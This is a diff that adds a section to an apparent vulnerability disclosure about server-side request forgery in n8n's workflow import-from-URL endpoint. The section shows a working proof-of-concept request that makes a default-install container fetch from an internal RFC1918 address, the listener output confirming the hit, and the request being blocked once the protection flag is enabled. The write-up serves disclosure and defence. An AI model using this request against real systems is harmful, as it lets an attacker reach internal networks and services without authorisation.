@@ -142,6 +142,30 @@ includes loopback, link-local/metadata, and RFC1918 ranges.
 | `N8N_SSRF_PROTECTION_ENABLED=true` | endpoint unprotected | protected |
 | Default install (flag unset) | vulnerable | **still vulnerable** |
 
+### Live confirmation on the latest release (n8n@2.28.2, 2026-06-27)
+
+Stock container, no flags (`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false
+n8nio/n8n:2.28.2`), import pointed at an internal RFC1918 listener:
+
+```
+GET /rest/workflows/from-url ... url=http://172.17.0.1:8888/
+--> HTTP 200
+{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
+
+listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2   (request from the n8n container)
+```
+
+Same request with `N8N_SSRF_PROTECTION_ENABLED=true`:
+
+```
+--> HTTP 400
+{"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
+(no request reaches the listener)
+```
+
+The protection works; the default-off setting is the only reason the current
+release is exploitable out of the box.
+
 ## Vendor position
 
 The vendor declined this report on 2026-05-20 as not qualifying, in part citing
